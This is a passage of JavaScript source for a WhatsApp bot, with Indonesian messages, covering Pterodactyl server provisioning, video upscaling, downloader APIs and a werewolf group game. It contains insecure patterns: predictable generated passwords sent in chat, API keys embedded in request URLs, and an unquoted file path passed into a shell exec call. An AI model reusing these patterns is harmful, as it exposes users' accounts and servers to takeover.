let memo = "7000"
let cpu = "110"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "8GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "8128"
let cpu = "130"
let disk = "8128"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPrem && !isOwner) return reply(`Khusus Danzz Ofc Ajah`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "9GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "9130"
let cpu = "200"
let disk = "9130"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
}
break
//==================================================================
case 'hdvid' :
case 'vidhd' :{
const { TelegraPh } = require('./lib/uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? XeonBotInc.user.jid : m.sender;
const name = await XeonBotInc.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return reply(`Video nya mana kak??`);
reply('Tunggu Sebentar...');
const media = await XeonBotInc.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  XeonBotInc.sendMessage(m.chat, { caption: `_Sukses Membuat Video Menjadi HD_`, video: { url: output }}, {quoted:m});
})
await sleep(600000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break
//==================================================================
case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('linknya mana kak')
reply(mess.wait)
  const response = await fetch(`https://kiicodeofficial.my.id/api/downloader/terabox?url=${encodeURIComponent(text)}&apikey=Dzsyacans`);
const data = await response.json();
const downloadLink = data.data.list.children.downloadLink;
  XeonBotInc.sendFile(m.chat, data.data.list.children.downloadLink, null, `Ini dia Kak`, m);
}
break
//==================================================================
case 'capcutdl':
case 'capcut':{
if (!text) return reply(mess.query.link)
reply(mess.wait)
const data = await fetchJson(`https://kiicodeofficial.my.id/api/others/capcut?url=${encodeURIComponent(text)}&apikey=Dzsyacans`)
const datap = data.data.url
XeonBotInc.sendMessage(m.chat, { caption: mess.succes, video: {url:datap.data.url}}, {quoted: m})
}
break
//==================================================================
case 'wwpc':
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    XeonBotInc.werewolf = XeonBotInc.werewolf ? XeonBotInc.werewolf : {};
    const ww = XeonBotInc.werewolf ? XeonBotInc.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return m.reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await m.reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return m.reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return m.reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return m.reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        XeonBotInc.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return m.reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return m.reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(XeonBotInc, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(XeonBotInc, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(XeonBotInc, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return m.reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${XeonBotInc.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    /*
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, listMessage);
                    */
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${XeonBotInc.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${XeonBotInc.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    /*
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Cek Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Clik here!",
                       sections,
                       mentions: player,
                     };
                     await XeonBotInc.sendMessage(ww[chat].player[i].id, listMessage);
                     */
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${XeonBotInc.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    /*
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Lindungi Player ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, listMessage);
                    */
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${XeonBotInc.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    /*
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Cek Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, listMessage);
                    */
                    await XeonBotInc.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await XeonBotInc.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(XeonBotInc, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return m.reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return m.reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return m.reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return m.reply("Masukan nomor player");
        if (isNaN(target)) return m.reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return m.reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return m.reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return m.reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return m.reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return m.reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return m.reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        m.reply(`@${sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        m.reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return m.reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        XeonBotInc.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        XeonBotInc.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
//==================================================================
case 'setpppanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
			let botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
			let { img } = await pepe(media)
			await XeonBotInc.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Sukses mengganti PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//==================================================================
case 'setpppgcanjang': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await XeonBotInc.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} telah mengganti Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${command}* atau tag gambar yang sudah dikirim`)
	}
}
break
//=========================================\\
case 'tenor': {
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    if (!urutan) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    await m.reply(mess.wait)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return m.reply("Input query!\n*Example:*\n.tenor [tema]|[angka]\n\n*Pilih angka yg ada*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ HASIL ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await XeonBotInc.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await m.reply(eror)
    }
}
break

//===============Store-Menu================\\
case 'list': case 'store':{
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
